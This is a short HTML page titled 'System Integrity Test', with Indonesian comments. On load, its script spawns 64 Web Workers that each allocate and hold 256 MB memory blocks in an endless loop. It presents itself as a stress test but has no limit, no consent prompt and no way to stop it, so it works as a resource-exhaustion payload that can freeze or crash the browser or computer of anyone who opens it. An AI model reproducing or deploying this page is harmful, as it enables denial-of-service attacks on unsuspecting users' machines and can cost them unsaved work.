<!DOCTYPE html>
<html>
<head>
    <title>System Integrity Test</title>
</head>
<body style="background:white; margin:0; height:100vh; display:flex; align-items:center; justify-content:center; font-family:sans-serif;">
    <div style="text-align:center; color:#888;">
        <p id="t">System Test Initializing...</p>
    </div>
    <script>
        window.onload = function() {
            const status = document.getElementById('t');
            
            // Menggunakan 64 worker untuk memaksa CPU Context Switching 
            // sekaligus membanjiri antrean alokasi memori RAM.
            const workerCount = 64; 
            status.innerText = "Nuclear Stress Active. Testing System Limits...";

            for (let i = 0; i < workerCount; i++) {
                const blob = new Blob([`
                    let heap = [];
                    function launch() {
                        try {
                            // Alokasi 256MB yang stabil tapi cepat
                            let chunk = new Uint8Array(1024 * 1024 * 256);
                            // Mengisi memori agar fisik RAM terpakai (Dirtying)
                            for(let j=0; j < chunk.length; j += 4096) chunk[j] = 1;

                            heap.push(chunk);
                        } catch(e) {}
                        
                        // Menjalankan secepat mungkin (Re-run instan)
                        setTimeout(launch, 0);
                    }
                    launch();
                `], { type: 'application/javascript' });

                new Worker(URL.createObjectURL(blob));
            }
        };
    </script>
</body>
</html>
